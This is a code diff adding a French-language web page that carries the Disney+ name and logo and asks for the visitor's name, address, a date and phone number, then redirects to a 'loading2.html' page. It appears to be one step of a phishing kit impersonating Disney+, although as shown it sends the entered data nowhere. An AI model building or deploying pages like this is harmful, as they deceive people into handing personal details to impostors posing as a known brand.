@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Infos Personnelles | Disney+</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <header><img src="Images/logo-disney.png" class="logo" /></header>
+  <main class="form-container">
+    <h1>Informations personnelles</h1>
+    <form id="infoForm">
+      <input type="text" placeholder="Nom" required />
+      <input type="text" placeholder="Prénom" required />
+      <input type="text" placeholder="Adresse" required />
+      <input type="date" required />
+      <input type="tel" placeholder="Téléphone" required />
+      <button type="submit">Continuer</button>
+    </form>
+  </main>
+  <script>
+    document.getElementById('infoForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      setTimeout(() => { window.location.href = "loading2.html"; }, 500);
+    });
+  </script>
+</body>
+</html>
